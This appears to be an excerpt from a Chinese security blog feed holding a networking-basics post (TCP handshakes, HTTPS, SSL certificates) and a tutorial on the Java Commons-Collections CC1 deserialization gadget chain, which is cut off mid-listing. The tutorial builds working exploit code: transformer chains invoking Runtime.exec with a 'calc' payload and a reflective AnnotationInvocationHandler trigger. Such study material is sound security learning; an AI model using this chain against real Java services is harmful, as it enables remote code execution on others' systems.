    <url>/2023/09/14/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-2/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透基础-2"><a href="#渗透基础-2" class="headerlink" title="渗透基础-2"></a>渗透基础-2</h1><h2 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h2><p>TCP 协议是面向连接的、可靠的、基于字节流的传输层协议。</p><p>面向连接：</p><ul><li>一对一才能连接，不能想 UDP 协议一样可以以一个主机同时向多个主机发送消息</li></ul><p>可靠的：</p><ul><li>无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端</li></ul><h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309141358374.png" alt="TCP 头格式"></p><p>客户端 IP 地址和端口号、服务器 IP 地址和端口号这样的四元组可唯一确定互联网中每个 TCP 连接的双方。</p><p>标志位置为 1 的含义：</p><ul><li>URG：紧急指针有效</li><li>ACK：确认序号有效（ 确认应答 ）</li><li>PSH：接收方应该尽快的将这个报文段交给应用层</li><li>RST：重建连接</li><li>SYN：同步序号，用来发起一个连接 （ 表示希望建立连接 ）</li><li>FIN：发送端完成发送任务 （ 希望断开连接 ）</li></ul><h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><p>TCP 采用三次握手建立连接的原因：</p><ul><li>为解决请求丢失问题，采用超时重传的方法。客户端发送请求后，启动一个定时器，定时器超时，则客户端再次发送请求</li><li>为解决超时重传出现重复连接问题，三次握手通过对所有报文进行编号解决，TCP 给每字节一个 32 位的序号，每次建立连接时都产生一个新的初始序号</li></ul><p>三次握手过程：</p><ol><li>客户端向服务端发起请求，初始化一个客户端序列号（ <code>client_isn</code> ），放入TCP首部的 <code>[序列号]</code> 字段，然后将 SYN 置为 1，表示向服务端发起连接</li><li>服务端收到请求后，先是初始化一个服务端序列号（ <code>server_isn</code> ），放入TCP首部的 <code>[序列号]</code> 字段。之后把客户端的序列号 + 1 后放入 <code>[确认应答号]</code> 字段。最后将 SYN + ACK 置为 1 响应客户端</li><li>客户端收到响应后，返回一个应答报文，该应答报文为 ACK 且将服务端序列号 + 1 放到  <code>[确认应答号]</code> 字段</li></ol><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309141358211.png" alt="img"></p><h3 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h3><p>TCP 断开连接采用四次挥手的方式，双方都可以主动断开连接，断开连接后主机中的资源将被释放。</p><p>为什么要四次挥手？</p><ul><li>客户端主动请求断开连接，发送 FIN 报文，但其仍然可以接收数据</li><li>服务端收到客户端的 FIN 报文后，响应 ACK ，表示知道了。但是服务端的数据可能还没有发送完，等待其发送完之后，给客户端一个 FIN 报文，表示我这里好了，同意断开连接。</li><li>其实就是要等待双方的数据都处理完，都不发送了，然后再断开连接。</li></ul><p>四次挥手过程：</p><ul><li>客户端打算关闭连接，此时会发送一个 TCP 首部 <code>FIN</code> 标志位被置为 <code>1</code> 的报文，也即 <code>FIN</code> 报文，之后客户端进入 <code>FIN_WAIT_1</code> 状态。</li><li>服务端收到该报文后，就向客户端发送 <code>ACK</code> 应答报文，接着服务端进入 <code>CLOSE_WAIT</code> 状态。</li><li>客户端收到服务端的 <code>ACK</code> 应答报文后，之后进入 <code>FIN_WAIT_2</code> 状态。</li><li>等待服务端处理完数据后，也向客户端发送 <code>FIN</code> 报文，之后服务端进入 <code>LAST_ACK</code> 状态。</li><li>客户端收到服务端的 <code>FIN</code> 报文后，回一个 <code>ACK</code> 应答报文，之后进入 <code>TIME_WAIT</code> 状态</li><li>服务端收到了 <code>ACK</code> 应答报文后，就进入了 <code>CLOSE</code> 状态，至此服务端已经完成连接的关闭。</li><li>客户端在经过 <code>2MSL</code> 一段时间后，自动进入 <code>CLOSE</code> 状态，至此客户端也完成连接的关闭。</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309141358696.png" alt="客户端主动关闭连接 —— TCP 四次挥手"></p><h2 id="HTTPS-原理"><a href="#HTTPS-原理" class="headerlink" title="HTTPS 原理"></a>HTTPS 原理</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309141358670.png" alt="img"></p><p>核心一点的原理在于非对称加密，客户端生成随机码并使用公钥进行加密，而此加密为非对称加密，只有服务端的私钥可以解密获取随机码，然后它们再利用随机码对传输数据进行对称加密。随机码只有服务端的私钥可以解密，保证安全性。</p><h2 id="SSL-证书"><a href="#SSL-证书" class="headerlink" title="SSL 证书"></a>SSL 证书</h2><p>SSL 证书是一个数字证书，用于认证网站的身份并启用加密连接。SSL 代表安全套接字层，这是一个安全协议，可在 Web 服务器和 Web 浏览器之间创建加密链接。</p><p>SSL 的原理是确保用户和网站之间或两个系统之间传输的任何数据始终无法被读取。它使用加密算法对传输中的数据进行加密，从而防止黑客读取通过连接发送的数据。</p><p>该过程如下所示：</p><ol><li>浏览器或服务器尝试连接到使用 SSL 保护的网站（即 Web 服务器）。</li><li>浏览器或服务器请求 Web 服务器证明自己的身份。</li><li>作为响应，Web 服务器向浏览器或服务器发送它的 SSL 证书的副本。</li><li>浏览器或服务器检查以了解是否信任 SSL 证书。如果信任，它将向 Web 服务器发出信号。</li><li>然后，Web 服务器返回经过数字签名的确认，以启动 SSL 加密会话。</li><li>加密数据在浏览器或服务器与 Web 服务器之间共享。</li></ol><p>此过程有时称为“SSL 握手”。虽然这个过程听起来似乎很漫长，但实际发生时只有几毫秒。</p><p>当网站具备 SSL 证书保护时，首字母缩写 HTTPS（代表安全超文本传输协议）会显示在 URL 中。如果没有 SSL 证书，则只会显示字母 HTTP（即没有代表安全的 S）。URL 地址栏中也会显示一个挂锁图标。这表示信任，并向那些访问该网站的人提供了保证。</p><p>SSL 证书内容：</p><ul><li>针对其颁发证书的域名</li><li>颁发给哪个人、组织或设备</li><li>哪个证书颁发机构颁发了证书</li><li>证书颁发机构的数字签名</li><li>关联的子域</li><li>证书的颁发日期</li><li>证书的到期日期</li><li>公钥</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://segmentfault.com/a/1190000021494676">HTTPS 详解一：附带最精美详尽的 HTTPS 原理图</a></li><li><a href="https://segmentfault.com/a/1190000021559557">HTTPS详解二：SSL &#x2F; TLS 工作原理和详细握手过程</a></li><li><a href="https://www.xiaolincoding.com/network/3_tcp/tcp_interview.html#tcp-%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86">TCP 三次握手与四次挥手面试题</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections-1利用链</title>
    <link href="/2023/09/02/Java%E5%AE%89%E5%85%A8/CommonsCollections-1%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2023/09/02/Java%E5%AE%89%E5%85%A8/CommonsCollections-1%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-1-利用链"><a href="#CommonsCollections-1-利用链" class="headerlink" title="CommonsCollections-1 利用链"></a>CommonsCollections-1 利用链</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>JDK 8u65：<a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">Oracle JDK 8u65 全平台安装包下载 - 密码 8899</a></p><p>源码：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>下载源码 zip 文件，然后到 jdk 8u65 目录，解压自带的 src.zip，然后把下载的源码包中 <code>/src/share/classes</code>下的 sun 文件夹拷贝到 src 文件夹中去。</p><p><code>commons-collections</code> 环境直接使用 <code>ysoserial</code> 项目的即可。</p><h2 id="涉及的类"><a href="#涉及的类" class="headerlink" title="涉及的类"></a>涉及的类</h2><p>这里先理一下，利用链中涉及的接口和类：</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>这个类其实就是一个 <code>Map</code>，与其他 <code>Map</code> 不同的是，它在调用 <code>put</code> 方法时，会使用自定义的 <code>transform</code> 对 <code>key、value</code> 都做以一个转换再 <code>put</code> 进去。</p><p>构造函数这里是获取一个 <code>map</code>，然后就是 <code>key</code> 和 <code>vaule</code> 对应的 <code>Transformer</code> 类，不过构造函数是 <code>protected</code> 的，所以要使用 <code>decorate</code> 去获取一个实例：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061423182.png" alt="image-20230906142341029"></p><p> <code>Transformer</code> 是一个接口，其中的 <code>transform</code> 方法就是对输入对象做一个转换，这里就叫它转换器好了：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061425824.png" alt="image-20230906142547783"></p><p>实现该接口的有这几个：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061437131.png" alt="image-20230906143728086"></p><p>然后看一下这个 <code>map</code> 的 <code>put</code> 方法，它对 <code>key</code> 和 <code>value</code> 都做了一个转换：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061430611.png" alt="image-20230906143004577"></p><p>具体的转换方法就是调用构造函数那里传入的  <code>Transformer</code> 的  <code>transform</code> 方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061432280.png" alt="image-20230906143210238"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>这个类其实就是在构造的时候获取一个输入，然后再 <code>transform()</code> 的时候将这个输入返回。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061445760.png" alt="image-20230906144503711"></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>该类就是 CC1 链的执行类了，它的  <code>transform()</code> 的功能是通过反射执行某个方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061449189.png" alt="image-20230906144952109"></p><p>构造函数如下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061450205.png" alt="image-20230906145049150"></p><p>简单来说就是在构造的时候指定方法名、方法形参、实参，然后通过  <code>transform</code> 去使用 <code>input</code> 执行指定的方法。</p><p>可以看到该类实现了 <code>Serializable</code> 接口，可以进行反序列化操作，那么也就可以作为利用链的执行类：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061452528.png" alt="image-20230906145240508"></p><p>来使用该类去实现一个命令执行，<strong>这里需要注意的是 <code>Runtime</code> 类是没有实现 <code>Serializable</code> 接口的，那么后续进行序列化获取 payload 的时候就会出错，所以直接通过反射来获取 <code>Runtime</code> 实例</strong>。</p><blockquote><p>在 Java 中，待序列化的对象和所有它使用的内部属性对象，必须都实现了 <code>java.io.Serializable</code> 接口。</p></blockquote><p>使用反射来完成命令执行，这样写的话，我们只是使用了 <code>Runtime.class</code> ，它实际上是  <code>java.lang.Class</code> 对象，该类实现了  <code>Serializable</code> 接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 1. 获取 getRuntime 方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>    <span class="hljs-comment">// 2. 获取 Runtime 实例</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-comment">// 3. 获取 exec 方法</span><br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    <span class="hljs-comment">// 4. runtime 实例调用 exec 方法 参数为 &quot;calc&quot;</span><br>    exec.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>InvokerTransformer</code> 实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">// 1. 通过 getMethod 方法反射获取 getRuntime 方法</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>    <span class="hljs-comment">// 2. 通过 invoke 执行 getRuntime 获取 Runtime 对象</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntime);<br>    <span class="hljs-comment">// 3. 使用 Runtime 对象执行 exec 方法</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>它的作用就是获取一堆的 <code>Transformer</code>，然后执行它们的 <code>tranform</code> 方法，而我们只需要传入一个 <code>object</code>，即可，因为它前一个 <code>tranform</code> 的执行结果就是下一个 <code>tranform</code> 的参数。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061632120.png" alt="image-20230906163251046"></p><p>来张 P 牛的图：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061635975.png" alt="image-20230906163522939"></p><p>使用 <code>ChainedTransformer</code>  把上面的 <code>InvokerTransformer</code> 处理一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    chainedTransformer.transform(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 <code>transform</code> 是我手动调用的，在前面的 <code>TransformedMap</code> 中有说过，它执行 <code>put</code> 的时候就会调用 <code>transform</code> 进行处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-comment">// 获取一个 chainedTransformer ( 转换器 )</span><br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-comment">// 创建一个 TransformedMap, 设置 key 的转换器为 chainedTransformer</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, chainedTransformer, <span class="hljs-literal">null</span>);<br>    <span class="hljs-comment">// put 触发 transformKey 方法, 其使用 chainedTransformer 的 transform 处理数据, 导致触发命令执行</span><br>    decorate.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061650330.png" alt="image-20230906165018236"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309061650757.png" alt="image-20230906165033598"></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CC1 利用链可以分 2 条：</p><ol><li><code>Transform</code></li><li><code>LazyMap</code></li></ol><h3 id="TransformMap"><a href="#TransformMap" class="headerlink" title="TransformMap"></a><code>TransformMap</code></h3><p><code>TransformMap</code>  链在上面涉及的类模块其实差不多分析完了，就剩下最后一个问题：</p><p>上面是我手动去触发执行 <code>transform</code> 方法的（ <code>put</code> ），现在要找一个在反序列化的过程中会导致 <code>transform</code> 触发的入口类。</p><p>这个其实就是逆推即可，在 <code>TransformMap</code> 中执行了 <code>key/value</code> 的 <code>transform</code>  共有 6 个方法，其分别是：</p><ul><li>直接调用：<code>transformKey、transformValue</code></li><li>间接调用：<code>transformMap、checkSetValue、put、putAll</code></li></ul><p>入手的点是在 <code>checkSetValue</code> 中，其他的其实自己找一下调用就可以排除了，<code>transformKey、transformValue</code>  就没有被调用，<code>put</code> 调用上万个地方 ….</p><p>这里先看一下 <code>checkSetValue</code> 方法，是使用 <code>valueTransformer</code> 触发的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062100398.png" alt="image-20230906210021373"></p><p>那么上面的代码修改成这样后，只要  <code>checkSetValue</code>  被调用就可以执行命令了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br></code></pre></td></tr></table></figure><p>找  <code>checkSetValue</code> 调用：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062104975.png" alt="image-20230906210401851"></p><p><code>Entry</code> 代表的是 Map 中的一个键值对，它其实重写了父类 <code>AbstractMapEntryDecorator</code> 的 <code>setValue</code> 方法，在遍历 Map 时就可以调用这个方法。</p><p>再向上跟，发现有一个是在 <code>readObject()</code> 方法调用的，这不就是我们要找的入口类嘛</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062037197.png" alt="image-20230906203701072"></p><p>可以看到 <code>memberValues</code> 可控：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062126932.png" alt="image-20230906212652883"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062127629.png" alt="image-20230906212727510"></p><p>看一下构造函数，<code>memberValues</code> 传入构造的 <code>TransformedMap</code> 即可，这里的 <code>type</code> 查了一下是叫注解：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062141884.png" alt="image-20230906214106841"></p><p>不过并没有写明声明，所以说明这个类只能在sun.reflect.annotation这个本包下被调用，我们要想在外部调用，需要用到反射来解决:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取 AnnotationInvocationHandler 类</span><br>Class c=Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-comment">// 获取构造函数</span><br>Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);<br><span class="hljs-comment">// 设置为可访问</span><br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 执行构造函数</span><br>Object o=constructor.newInstance(Target.class,decorate); <br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/w3cnote/java-annotation.html">Java 注解（Annotation）</a></p><p>然后看看反序列化这里， <code>setValue</code> 方法调用是有条件的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062202063.png" alt="image-20230906220250009"></p><p>这里跟一下 <code>memberType</code>，最后是跟到我在构造函数输入的注解这里：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062205456.png" alt="image-20230906220532401"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062206902.png" alt="image-20230906220633795"></p><p>翻了下注释，大概功能如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取指定注解类型的实例</span><br>annotationType = AnnotationType.getInstance(type);<br><span class="hljs-comment">// 获取注释类型的成员类型-成员方法之类的</span><br>Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><span class="hljs-comment">// 获取 key 值</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br><span class="hljs-comment">// 获取注解类型中名字为 key 的类型</span><br>Class&lt;?&gt; memberType = memberTypes.get(name);<br></code></pre></td></tr></table></figure><p>那么其实找一个注解，然后把我们上面 <code>Map</code> 的 <code>key</code> 设置为它里面的方法名即可。</p><p>这里使用的是 <code>@Target</code> 其内部有一个叫 <code>value</code> 的成员：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309062230801.png" alt="image-20230906223014763"></p><p>那么设置 <code>key</code> 为 <code>value</code> 即可，完成的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>    <span class="hljs-comment">// 执行类</span><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    objectObjectHashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span 